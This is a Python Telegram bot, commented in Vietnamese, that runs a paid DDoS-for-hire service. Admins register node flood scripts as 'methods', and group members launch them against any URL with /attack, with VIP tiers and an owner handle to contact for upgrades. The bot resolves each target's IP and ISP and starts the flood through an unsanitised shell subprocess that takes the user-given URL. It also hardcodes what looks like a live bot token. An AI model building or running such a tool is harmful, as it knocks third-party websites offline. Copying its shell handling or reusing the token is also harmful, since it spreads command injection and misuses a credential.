import time, json, asyncio, socket, requests, os
from urllib import parse
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler
from pytz import timezone
from html import escape

TOKEN = '8185251236:AAHZ42qwZVXolyjmw5z-kR-x8XIzQmiDq1E'
ADMIN_IDS = [7731091077]
VIP_USERS_FILE, METHODS_FILE, GROUPS_FILE, BLACKLIST_FILE = 'vip_users.json', 'methods.json', 'groups.json', 'blacklist.json'

# user_processes: map user_id -> list of asyncio subprocesses (to allow multiple concurrent procs per user)
user_processes = {}

# max concurrent attacks per user
MAX_CONCURRENT_PER_USER = 1

def is_admin(user_id):
    return user_id in ADMIN_IDS

BOT_STATE_FILE = 'bot_state.json'

def get_bot_state():
    state = load_json(BOT_STATE_FILE)
    return state.get("active", True)

def set_bot_state(active):
    save_json(BOT_STATE_FILE, {"active": active})

def load_json(file): return json.load(open(file, 'r')) if os.path.exists(file) else {}
def save_json(file, data): json.dump(data, open(file, 'w'), indent=4)

def get_thoi_gian_vn(): return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')

def load_blacklist():
    return set(load_json(BLACKLIST_FILE))

def lay_ip_va_isp(url):
    try:
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}")
    except:
        return None, None
    return ip, response.json() if response.ok else None

async def turn_on_bot(update, context):
    if update.message.from_user.id not in ADMIN_IDS:
        return await context.bot.send_message(update.message.chat.id, "🌊 Bạn Không Có Quyền 🛑.")
    set_bot_state(True)
    await context.bot.send_message(update.message.chat.id, "✅ Bot Đã Được Bật 💻.")

async def turn_off_bot(update, context):
    if update.message.from_user.id not in ADMIN_IDS:
        return await context.bot.send_message(update.message.chat.id, "🌊 Bạn Không Có Quyên 🛑.")
    set_bot_state(False)
    await context.bot.send_message(update.message.chat.id, "❌ Bot Đã Được Tắt 💻.")

async def pkill_handler(update, context):
    if update.message.from_user.id not in ADMIN_IDS: return await context.bot.send_message(update.message.chat.id, "🔥Không có quyền🔥.")
    for cmd in ["pkill -9 -f flood", "pkill -9 -f https", "pkill -9 -f bypass", "pkill -9 -f tls"]:
        process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        if (await process.communicate())[1]:
            return await context.bot.send_message(update.message.chat.id, "🔥Lỗi xảy ra🔥.")
    return await context.bot.send_message(update.message.chat.id, "❄Đã tắt các tiến trình thành công❄️.")

async def command_handler(update, context, handler_func, min_args, help_text):
    if len(context.args) < min_args: return await context.bot.send_message(update.message.chat.id, help_text)
    await handler_func(update, context)

async def them_phuong_thuc(update, context, methods_data):
    if update.message.from_user.id not in ADMIN_IDS: 
        return await context.bot.send_message(update.message.chat.id, "🔥Không có quyền🔥.")
    
    # Cần tối thiểu 3 tham số: name, method(GET/POST/NONE), url
    if len(context.args) < 3: 
        return await context.bot.send_message(update.message.chat.id, "Cách sử dụng: /add <method_name> <GET/POST/NONE> <url> timeset <time> [vip/member]")
    
    method_name = context.args[0]
    req_method = context.args[1].upper() # Lấy GET, POST hoặc NONE
    url = context.args[2]
    attack_time = 60

    # Kiểm tra method hợp lệ (Thêm NONE)
    if req_method not in ['GET', 'POST', 'NONE']:
        return await context.bot.send_message(update.message.chat.id, "⚠️ Loại method phải là GET, POST hoặc NONE.")

    if 'timeset' in context.args:
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except: return await context.bot.send_message(update.message.chat.id, "🔥Thời gian không hợp lệ🔥.")
    
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    
    # Lọc các tham số khác để đưa vào lệnh (bỏ qua 3 tham số đầu và các cờ cài đặt)
    extra_args = [arg for arg in context.args[3:] if arg not in ['[vip]', '[member]', 'timeset']]
    
    # Tạo lệnh: node ...
    # Nếu là NONE thì KHÔNG chèn req_method vào lệnh
    if req_method == 'NONE':
        command = f"node --max-old-space-size=65536 {method_name} {url} " + " ".join(extra_args)
    else:
        command = f"node --max-old-space-size=65536 {method_name} {req_method} {url} " + " ".join(extra_args)
    
    methods_data[method_name] = {
        'command': command, 
        'url': url, 
        'time': attack_time, 
        'visibility': visibility,
        'type': req_method 
    }
    save_json(METHODS_FILE, methods_data)
    return await context.bot.send_message(update.message.chat.id, f"Phương thức {method_name} ({req_method}) đã thêm với quyền {visibility}.")

async def xoa_phuong_thuc(update, context, methods_data):
    if update.message.from_user.id not in ADMIN_IDS: return await context.bot.send_message(update.message.chat.id, "Không có quyền.")
    if len(context.args) < 1: return await context.bot.send_message(update.message.chat.id, "Cách sử dụng: /del <method_name>")
    method_name = context.args[0]
    if method_name not in methods_data: return await context.bot.send_message(update.message.chat.id, f"Không tìm thấy phương thức {method_name}.")
    del methods_data[method_name]
    save_json(METHODS_FILE, methods_data)
    return await context.bot.send_message(update.message.chat.id, f"Phương thức {method_name} đã bị xóa.")

async def tao_choi(update, context, methods_data, vip_users, groups_data):
    if not get_bot_state() and update.message.from_user.id not in ADMIN_IDS:
        return await context.bot.send_message(update.message.chat.id, "❌ Bot Hiện Tại Đang Tắt 💻.")
    user_id, chat_id = update.message.from_user.id, update.message.chat.id
    if chat_id not in groups_data: return await context.bot.send_message(update.message.chat.id, "❄Nhóm này không được phép❄.")
    
    # Kiểm tra số tiến trình đang chạy 
    procs = user_processes.get(user_id, [])
    running = [p for p in procs if getattr(p, 'returncode', 1) is None]  
    
    if len(running) >= MAX_CONCURRENT_PER_USER:
        return await context.bot.send_message(update.message.chat.id, f"🚫 Bạn chỉ được chạy tối đa {MAX_CONCURRENT_PER_USER} tấn công cùng lúc. Vui lòng chờ tiến trình khác hoàn tất.")
    
    if len(context.args) < 2: return await context.bot.send_message(update.message.chat.id, "Cách sử dụng: /attack <method_name> <url> [time]")
    method_name, url = context.args[0], context.args[1]
    if method_name not in methods_data: return await context.bot.send_message(update.message.chat.id, "❄Không tìm thấy phương thức❄.")
    
    # Kiểm tra domain trong blacklist
    blacklist = load_blacklist()
    domain = parse.urlsplit(url).netloc.lower()
    if domain in blacklist:
        try:
            response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
            if response.ok and 'text' in response.headers.get('Content-Type', ''):
                content_preview = response.text[:1000]
                message = f"❌ Website <b>{domain}</b> đã bị chặn bởi admin.\n\n<b>Nội dung trang:</b>\n<pre>{escape(content_preview)}</pre>"
            else:
                message = f"❌ Website <b>{domain}</b> đã bị chặn bởi admin.\nKhông thể tải nội dung hoặc không phải trang văn bản."
        except Exception as e:
            message = f"❌ Website <b>{domain}</b> đã bị chặn bởi admin.\nLỗi khi tải nội dung: {e}"

        return await context.bot.send_message(update.message.chat.id, message, parse_mode='HTML')

    method = methods_data[method_name]
    # kiểm tra quyền VIP
    if method['visibility'] == 'VIP' and user_id not in ADMIN_IDS and user_id not in vip_users:
        return await context.bot.send_message(update.message.chat.id, "Người dùng không có quyền sử dụng phương thức VIP🥇.")
    
    attack_time = method['time']
    if user_id in ADMIN_IDS and len(context.args) > 2:
        try: attack_time = int(context.args[2])
        except: return await context.bot.send_message(update.message.chat.id, "🔥Thời gian không hợp lệ🔥.")
    
    ip, isp_info = lay_ip_va_isp(url)
    if not ip: return await context.bot.send_message(update.message.chat.id, "❄Không lấy được IP❄.")
    
    # Thay thế URL và Time vào lệnh command đã lưu
    command = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Không có thông tin ISP.'
    username, start_time = update.message.from_user.username or update.message.from_user.full_name, time.time()
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Kiểm tra trạng thái", url=f"https://check-host.net/check-http?host={url}")]])
    
    await context.bot.send_message(update.message.chat.id, f"Tấn công {method_name} bởi @{username}.\nISP:\n<pre>{escape(isp_info_text)}</pre>\nThời gian: {attack_time}s\nBắt đầu: {get_thoi_gian_vn()}", parse_mode='HTML', reply_markup=keyboard)
    
    # khởi tạo list nếu chưa có
    user_processes.setdefault(user_id, [])
    # tạo task thực thi tấn công
    asyncio.create_task(thuc_hien_tan_cong(command, update, method_name, start_time, attack_time, user_id, context))

async def hien_thi_blacklist(update, context):
    if update.message.from_user.id not in ADMIN_IDS:
        return await context.bot.send_message(update.message.chat.id, "Không có quyền.")
    
    blacklist = load_json(BLACKLIST_FILE)
    if not blacklist:
        return await context.bot.send_message(update.message.chat.id, "Danh sách blacklist đang trống.")
    
    danh_sach = "\n".join(f"- {domain}" for domain in blacklist)
    await context.bot.send_message(update.message.chat.id, f"Danh sách blacklist:\n{danh_sach}")

async def quan_ly_blacklist(update, context, action):
    if update.message.from_user.id not in ADMIN_IDS:
        return await context.bot.send_message(update.message.chat.id, "Không có quyền.")

    if len(context.args) < 1:
        return await context.bot.send_message(update.message.chat.id, f"Cách sử dụng: /{action}blacklist <domain>")

    domain = context.args[0].lower()
    blacklist = set(load_json(BLACKLIST_FILE))

    if action == "add":
        blacklist.add(domain)
        save_json(BLACKLIST_FILE, list(blacklist))
        return await context.bot.send_message(update.message.chat.id, f"Đã chặn: {domain}")
    elif action == "remove":
        if domain in blacklist:
            blacklist.remove(domain)
            save_json(BLACKLIST_FILE, list(blacklist))
            return await context.bot.send_message(update.message.chat.id, f"Đã bỏ chặn: {domain}")
        else:
            return await context.bot.send_message(update.message.chat.id, "Domain không tồn tại trong blacklist.")

async def thuc_hien_tan_cong(command, update, method_name, start_time, attack_time, user_id, context):
    """Thực thi command trong subprocess, quản lý user_processes[user_id] là list để hỗ trợ nhiều tiến trình."""
    proc = None
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        proc = process
        # thêm vào list quản lý
        user_processes.setdefault(user_id, []).append(process)
        stdout, stderr = await process.communicate()
        error_message = stderr.decode() if stderr else None
        end_time, attack_status = time.time(), "thành công" if not stderr else "thất bại"
    except Exception as e:
        error_message = str(e)
        end_time, attack_status = time.time(), "thất bại"
    
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {
        "method_name": method_name, "username": update.message.from_user.username or update.message.from_user.full_name,
        "start_time": get_thoi_gian_vn(), "end_time": get_thoi_gian_vn(),
        "elapsed_time": elapsed_time, "attack_status": attack_status, "error": error_message or "Không có"
    }
    safe_attack_info_text = escape(json.dumps(attack_info, indent=2, ensure_ascii=False))
    await context.bot.send_message(update.message.chat.id, f"Tấn công hoàn tất! Thời gian: {elapsed_time}s.\n\nChi tiết:\n<pre>{safe_attack_info_text}</pre>", parse_mode='HTML')
    
    # loại bỏ tiến trình khỏi danh sách (nếu còn)
    try:
        if user_id in user_processes:
            user_processes[user_id] = [p for p in user_processes[user_id] if p is not proc and getattr(p, 'returncode', 1) is None]
            if not user_processes[user_id]:
                del user_processes[user_id]
    except Exception:
        user_processes.pop(user_id, None)

async def danh_sach_phuong_thuc(update, context, methods_data):
    if not methods_data: return await context.bot.send_message(update.message.chat.id, "❄Không có phương thức nào❄.")
    # Hiển thị thêm thông tin type (GET/POST) nếu có
    methods_list = "\n".join([f"{name} [{data.get('type', 'UNK')}] ({data['visibility']}): {data['time']}s" for name, data in methods_data.items()])
    await context.bot.send_message(update.message.chat.id, f"Các phương thức có sẵn:\n{methods_list}")

async def quan_ly_vip_user(update, context, vip_users, action):
    if update.message.from_user.id not in ADMIN_IDS: return await context.bot.send_message(update.message.chat.id, "Không có quyền.")
    if len(context.args) < 1: return await context.bot.send_message(update.message.chat.id, f"Cách sử dụng: /{'vipuser' if action == 'add' else 'delvip'} <uid>")
    try:
        user_id = int(context.args[0])
    except ValueError:
        return await context.bot.send_message(update.message.chat.id, "ID người dùng không hợp lệ.")
        
    if action == "add":
        vip_users.add(user_id)
        save_json(VIP_USERS_FILE, list(vip_users))
        return await context.bot.send_message(update.message.chat.id, f"Người dùng {user_id} đã được thêm vào VIP.")
    if action == "remove":
        if user_id in vip_users: 
            vip_users.remove(user_id)
            save_json(VIP_USERS_FILE, list(vip_users))
            return await context.bot.send_message(update.message.chat.id, f"Người dùng {user_id} đã được xóa khỏi VIP.")
        else: 
            return await context.bot.send_message(update.message.chat.id, f"Người dùng {user_id} không có trong danh sách VIP.")

async def them_nhom(update, context, groups_data):
    if update.message.from_user.id not in ADMIN_IDS: return await context.bot.send_message(update.message.chat.id, "🔥Không có quyền🔥.")
    if len(context.args) < 1: return await context.bot.send_message(update.message.chat.id, "Cách sử dụng: /addgroup <uid>")
    try:
        group_id = int(context.args[0])
    except ValueError:
        return await context.bot.send_message(update.message.chat.id, "ID nhóm không hợp lệ.")
    groups_data.add(group_id)
    save_json(GROUPS_FILE, list(groups_data))
    return await context.bot.send_message(update.message.chat.id, f"Nhóm {group_id} đã được thêm vào danh sách cho phép.")

async def xoa_nhom(update, context, groups_data):
    if update.message.from_user.id not in ADMIN_IDS: return await context.bot.send_message(update.message.chat.id, "🔥Không có quyền🔥.")
    if len(context.args) < 1: return await context.bot.send_message(update.message.chat.id, "Cách sử dụng: /delgroup <uid>")
    try:
        group_id = int(context.args[0])
    except ValueError:
        return await context.bot.send_message(update.message.chat.id, "ID nhóm không hợp lệ.")
    if group_id not in groups_data: return await context.bot.send_message(update.message.chat.id, f"Nhóm {group_id} không tìm thấy.")
    groups_data.remove(group_id)
    save_json(GROUPS_FILE, list(groups_data))
    return await context.bot.send_message(update.message.chat.id, f"Nhóm {group_id} đã bị xóa.")

async def help_admin(update, context):
    """Lệnh /helpadmin - Chỉ gửi tin nhắn hướng dẫn cho admin."""
    if update.message.from_user.id not in ADMIN_IDS:
        return await context.bot.send_message(update.message.chat_id, "Bạn không có quyền truy cập lệnh này🥇.")
    help_text = (
        "/add <method_name> <GET/POST/NONE> <url> timeset <time> [vip/member] - Thêm phương thức tấn công\n"
        "(Sử dụng NONE nếu phương thức không cần GET/POST)\n"
        "/del <method_name> - Xóa phương thức tấn công\n"
        "/attack <method_name> <url> [time] - Thực hiện tấn công\n"
        "/methods - Liệt kê phương thức có sẵn\n"
        "/vipuser <uid> - Thêm người dùng vào VIP\n"
        "/delvip <uid> - Xóa người dùng khỏi VIP\n"
        "/addgroup <uid> - Thêm nhóm vào danh sách cho phép\n"
        "/delgroup <uid> - Xóa nhóm khỏi danh sách\n"
        "/pkill - Tắt tiến trình tấn công"
    )
    await context.bot.send_message(update.message.chat.id, help_text)

async def help_group(update, context):
    """Lệnh /help - Hiển thị hướng dẫn trong nhóm."""
    chat_id = update.message.chat_id

    help_text = (
        "🌷🌷 **Hướng dẫn sử dụng bot trong nhóm owner : @zentra999 🥇** 🌷🌷\n\n"
        "- `/methods` - Xem danh sách phương thức tấn công\n"
        "- `/attack <method_name> <url> [time]` - Thực hiện tấn công\n"
        "- `/pkill` - Dừng tất cả tiến trình tấn công\n\n"
        "💡 *Liên hệ @zentra999 để nâng cấp víp!*"
    )

    await context.bot.send_message(chat_id, help_text)

def main():
    methods_data = load_json(METHODS_FILE)
    vip_users = set(load_json(VIP_USERS_FILE)) if isinstance(load_json(VIP_USERS_FILE), list) else set()
    groups_data = set(load_json(GROUPS_FILE)) if isinstance(load_json(GROUPS_FILE), list) else set()

    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("blacklist", hien_thi_blacklist))

    app.add_handler(CommandHandler("helpadmin", help_admin))  # Lệnh dành cho admin
    app.add_handler(CommandHandler("help", help_group))  # Lệnh hiển thị trong nhóm

    # Cập nhật số lượng tham số tối thiểu cho lệnh add là 3 (MethodName, ReqMethod, URL)
    app.add_handler(CommandHandler("add", lambda u, c: command_handler(u, c, lambda u, c: them_phuong_thuc(u, c, methods_data), 3, "Cách sử dụng sai. Mẫu: /add <name> <GET/POST/NONE> <url> ...")))
    app.add_handler(CommandHandler("del", lambda u, c: command_handler(u, c, lambda u, c: xoa_phuong_thuc(u, c, methods_data), 1, "Cách sử dụng sai.")))
    app.add_handler(CommandHandler("attack", lambda u, c: command_handler(u, c, lambda u, c: tao_choi(u, c, methods_data, vip_users, groups_data), 2, "Cách sử dụng sai.")))
    app.add_handler(CommandHandler("methods", lambda u, c: danh_sach_phuong_thuc(u, c, methods_data)))
    app.add_handler(CommandHandler("vipuser", lambda u, c: quan_ly_vip_user(u, c, vip_users, "add")))
    app.add_handler(CommandHandler("delvip", lambda u, c: quan_ly_vip_user(u, c, vip_users, "remove")))
    app.add_handler(CommandHandler("addgroup", lambda u, c: them_nhom(u, c, groups_data)))
    app.add_handler(CommandHandler("delgroup", lambda u, c: xoa_nhom(u, c, groups_data)))
    app.add_handler(CommandHandler("pkill", pkill_handler))
    app.add_handler(CommandHandler("on", turn_on_bot))
    app.add_handler(CommandHandler("off", turn_off_bot))
    app.add_handler(CommandHandler("addblacklist", lambda u, c: quan_ly_blacklist(u, c, "add")))
    app.add_handler(CommandHandler("delblacklist", lambda u, c: quan_ly_blacklist(u, c, "remove")))

    app.run_polling()

if __name__ == "__main__": main()
